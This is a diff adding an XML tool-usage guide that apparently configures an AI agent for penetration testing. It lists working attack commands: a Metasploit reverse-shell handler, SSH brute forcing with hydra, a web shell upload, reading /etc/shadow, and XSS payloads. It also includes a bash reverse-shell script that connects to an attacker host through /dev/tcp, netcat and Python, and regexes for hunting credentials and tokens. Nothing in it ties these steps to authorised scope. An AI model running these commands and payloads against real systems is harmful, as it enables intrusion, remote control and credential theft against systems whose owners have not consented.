@@ -1,0 +1,358 @@
+<pen_tester_tool_usage>
+  <tool_priorities>
+    <priority level="1">
+      <tool>execute_command</tool>
+      <when>Primary tool for running penetration testing tools and exploits</when>
+      <why>Penetration testing relies heavily on specialized command-line tools and scripts</why>
+      <pentest_tools>
+        <tool>nmap - Network discovery and port scanning</tool>
+        <tool>metasploit - Exploit framework and payload generation</tool>
+        <tool>burp suite - Web application security testing</tool>
+        <tool>sqlmap - SQL injection testing</tool>
+        <tool>nikto - Web server vulnerability scanning</tool>
+        <tool>john - Password cracking</tool>
+        <tool>hashcat - Advanced password recovery</tool>
+        <tool>gobuster - Directory and file brute forcing</tool>
+      </pentest_tools>
+    </priority>
+
+    <priority level="2">
+      <tool>codebase_search</tool>
+      <when>Find existing penetration testing scripts and methodologies</when>
+      <why>Leverage previous testing work and established attack patterns</why>
+    </priority>
+
+    <priority level="3">
+      <tool>browser_action</tool>
+      <when>Manual web application testing and exploit validation</when>
+      <why>Many web vulnerabilities require manual testing and verification</why>
+    </priority>
+
+    <priority level="4">
+      <tool>write_to_file</tool>
+      <when>Create exploit scripts and document penetration testing findings</when>
+      <why>Custom exploits and detailed documentation are essential for penetration testing</why>
+    </priority>
+  </tool_priorities>
+
+  <tool_specific_guidance>
+    <tool name="execute_command">
+      <penetration_testing_phases>
+        <phase name="reconnaissance">
+          <purpose>Gather information about target systems</purpose>
+          <commands>
+            <command category="network_discovery">
+              <cmd>nmap -sn 192.168.1.0/24</cmd>
+              <purpose>Host discovery</purpose>
+            </command>
+            <command category="port_scanning">
+              <cmd>nmap -sS -sV -O target_ip</cmd>
+              <purpose>Service and OS detection</purpose>
+            </command>
+            <command category="dns_enumeration">
+              <cmd>dnsrecon -d target.com -t std</cmd>
+              <purpose>DNS record enumeration</purpose>
+            </command>
+            <command category="subdomain_discovery">
+              <cmd>subfinder -d target.com | httpx -silent</cmd>
+              <purpose>Live subdomain discovery</purpose>
+            </command>
+          </commands>
+        </phase>
+
+        <phase name="vulnerability_scanning">
+          <purpose>Identify potential security vulnerabilities</purpose>
+          <commands>
+            <command category="network_vulns">
+              <cmd>nmap --script vuln target_ip</cmd>
+              <purpose>Network vulnerability scanning</purpose>
+            </command>
+            <command category="web_vulns">
+              <cmd>nikto -h http://target.com</cmd>
+              <purpose>Web server vulnerability scanning</purpose>
+            </command>
+            <command category="ssl_testing">
+              <cmd>sslscan target.com:443</cmd>
+              <purpose>SSL/TLS configuration testing</purpose>
+            </command>
+            <command category="directory_bruteforce">
+              <cmd>gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</cmd>
+              <purpose>Directory and file discovery</purpose>
+            </command>
+          </commands>
+        </phase>
+
+        <phase name="exploitation">
+          <purpose>Attempt to exploit identified vulnerabilities</purpose>
+          <commands>
+            <command category="metasploit">
+              <cmd>msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit"</cmd>
+              <purpose>Reverse shell handler</purpose>
+            </command>
+            <command category="sql_injection">
+              <cmd>sqlmap -u "http://target.com/page.php?id=1" --dbs</cmd>
+              <purpose>SQL injection testing</purpose>
+            </command>
+            <command category="password_attacks">
+              <cmd>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip</cmd>
+              <purpose>SSH brute force attack</purpose>
+            </command>
+            <command category="web_shells">
+              <cmd>curl -X POST -F "file=@webshell.php" http://target.com/upload.php</cmd>
+              <purpose>Web shell upload</purpose>
+            </command>
+          </commands>
+        </phase>
+
+        <phase name="post_exploitation">
+          <purpose>Maintain access and gather additional information</purpose>
+          <commands>
+            <command category="privilege_escalation">
+              <cmd>sudo -l</cmd>
+              <purpose>Check sudo privileges</purpose>
+            </command>
+            <command category="system_enumeration">
+              <cmd>uname -a && cat /etc/passwd && ps aux</cmd>
+              <purpose>System information gathering</purpose>
+            </command>
+            <command category="network_enumeration">
+              <cmd>netstat -tulpn && arp -a</cmd>
+              <purpose>Network connections and ARP table</purpose>
+            </command>
+            <command category="credential_harvesting">
+              <cmd>cat /etc/shadow 2>/dev/null || cat /etc/passwd</cmd>
+              <purpose>Password file access</purpose>
+            </command>
+          </commands>
+        </phase>
+      </penetration_testing_phases>
+    </tool>
+
+    <tool name="browser_action">
+      <web_application_testing>
+        <technique name="manual_testing">
+          <purpose>Identify logic flaws and complex vulnerabilities</purpose>
+          <areas>
+            <area>Authentication bypass testing</area>
+            <area>Authorization flaw identification</area>
+            <area>Business logic vulnerability assessment</area>
+            <area>Client-side security testing</area>
+          </areas>
+        </technique>
+
+        <technique name="xss_testing">
+          <purpose>Cross-site scripting vulnerability identification</purpose>
+          <payloads>
+            <payload>&lt;script&gt;alert('XSS')&lt;/script&gt;</payload>
+            <payload>&lt;img src=x onerror=alert('XSS')&gt;</payload>
+            <payload>javascript:alert('XSS')</payload>
+          </payloads>
+        </technique>
+
+        <technique name="csrf_testing">
+          <purpose>Cross-site request forgery vulnerability testing</purpose>
+          <approach>Create malicious forms that submit requests to target application</approach>
+        </technique>
+
+        <technique name="session_testing">
+          <purpose>Session management vulnerability assessment</purpose>
+          <tests>
+            <test>Session fixation</test>
+            <test>Session hijacking</test>
+            <test>Insufficient session timeout</test>
+            <test>Weak session token generation</test>
+          </tests>
+        </technique>
+      </web_application_testing>
+    </tool>
+
+    <tool name="write_to_file">
+      <exploit_development>
+        <script_types>
+          <script name="python_exploit">
+            <path>exploits/custom_exploit.py</path>
+            <template><![CDATA[
+#!/usr/bin/env python3
+import socket
+import sys
+
+def exploit_target(target_ip, target_port):
+    """
+    Custom exploit for [vulnerability description]
+    """
+    try:
+        # Exploit payload
+        payload = b"A" * 1024  # Buffer overflow example
+        
+        # Connect to target
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target_ip, target_port))
+        
+        # Send exploit
+        sock.send(payload)
+        sock.close()
+        
+        print(f"[+] Exploit sent to {target_ip}:{target_port}")
+        
+    except Exception as e:
+        print(f"[-] Exploit failed: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python3 exploit.py <target_ip> <target_port>")
+        sys.exit(1)
+    
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2])
+    exploit_target(target_ip, target_port)
+            ]]></template>
+          </script>
+
+          <script name="bash_payload">
+            <path>payloads/reverse_shell.sh</path>
+            <template><![CDATA[
+#!/bin/bash
+# Reverse shell payload
+# Usage: ./reverse_shell.sh <attacker_ip> <attacker_port>
+
+ATTACKER_IP=$1
+ATTACKER_PORT=$2
+
+if [ -z "$ATTACKER_IP" ] || [ -z "$ATTACKER_PORT" ]; then
+    echo "Usage: $0 <attacker_ip> <attacker_port>"
+    exit 1
+fi
+
+# Multiple reverse shell methods
+echo "[+] Attempting reverse shell connection..."
+
+# Bash reverse shell
+bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
+
+# Netcat reverse shell (if available)
+nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT &
+
+# Python reverse shell (if available)
+python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash'])" &
+
+echo "[+] Reverse shell attempts initiated"
+            ]]></template>
+          </script>
+        </script_types>
+
+        <report_templates>
+          <report name="penetration_test_report">
+            <path>reports/pentest_report.md</path>
+            <sections>
+              <section>Executive Summary</section>
+              <section>Methodology</section>
+              <section>Scope and Limitations</section>
+              <section>Findings Summary</section>
+              <section>Detailed Findings</section>
+              <section>Risk Assessment</section>
+              <section>Recommendations</section>
+              <section>Appendices</section>
+            </sections>
+          </report>
+
+          <report name="vulnerability_details">
+            <path>reports/vulnerability_template.md</path>
+            <template><![CDATA[
+# Vulnerability: [Vulnerability Name]
+
+## Summary
+Brief description of the vulnerability and its impact.
+
+## Severity
+**Risk Level:** [Critical/High/Medium/Low]
+**CVSS Score:** [Score] ([Vector])
+
+## Affected Systems
+- System 1: [IP/Hostname]
+- System 2: [IP/Hostname]
+
+## Technical Details
+### Description
+Detailed technical description of the vulnerability.
+
+### Proof of Concept
+```bash
+# Commands used to exploit the vulnerability
+command1
+command2
+```
+
+### Evidence
+Screenshots, command outputs, or other evidence.
+
+## Business Impact
+Description of potential business impact if exploited.
+
+## Remediation
+### Immediate Actions
+1. Action 1
+2. Action 2
+
+### Long-term Solutions
+1. Solution 1
+2. Solution 2
+
+## References
+- [Reference 1](URL)
+- [Reference 2](URL)
+            ]]></template>
+          </report>
+        </report_templates>
+      </exploit_development>
+    </tool>
+
+    <tool name="search_files">
+      <pentest_patterns>
+        <pattern name="existing_exploits">
+          <regex>(exploit|payload|shell|attack)</regex>
+          <purpose>Find existing penetration testing scripts and exploits</purpose>
+        </pattern>
+        <pattern name="credentials">
+          <regex>(password|passwd|credential|key|token)</regex>
+          <purpose>Locate credential files and authentication tokens</purpose>
+        </pattern>
+        <pattern name="configuration_files">
+          <regex>(config|conf|\.ini|\.cfg)</regex>
+          <purpose>Find configuration files that may contain sensitive information</purpose>
+        </pattern>
+      </pentest_patterns>
+    </tool>
+  </tool_specific_guidance>
+
+  <testing_workflows>
+    <workflow name="network_penetration_test">
+      <sequence>
+        <step>execute_command - Network discovery and port scanning</step>
+        <step>execute_command - Service enumeration and vulnerability scanning</step>
+        <step>execute_command - Exploit vulnerable services</step>
+        <step>execute_command - Post-exploitation and privilege escalation</step>
+        <step>write_to_file - Document findings and create report</step>
+      </sequence>
+    </workflow>
+
+    <workflow name="web_application_test">
+      <sequence>
+        <step>browser_action - Manual application exploration</step>
+        <step>execute_command - Automated vulnerability scanning</step>
+        <step>browser_action - Manual vulnerability testing</step>
+        <step>execute_command - Exploit identified vulnerabilities</step>
+        <step>write_to_file - Create proof-of-concept and report</step>
+      </sequence>
+    </workflow>
+
+    <workflow name="wireless_security_test">
+      <sequence>
+        <step>execute_command - Wireless network discovery</step>
+        <step>execute_command - WPA/WEP cracking attempts</step>
+        <step>execute_command - Rogue access point testing</step>
+        <step>execute_command - Client-side attack testing</step>
+        <step>write_to_file - Document wireless security findings</step>
+      </sequence>
+    </workflow>
+  </testing_workflows>
+</pen_tester_tool_usage>
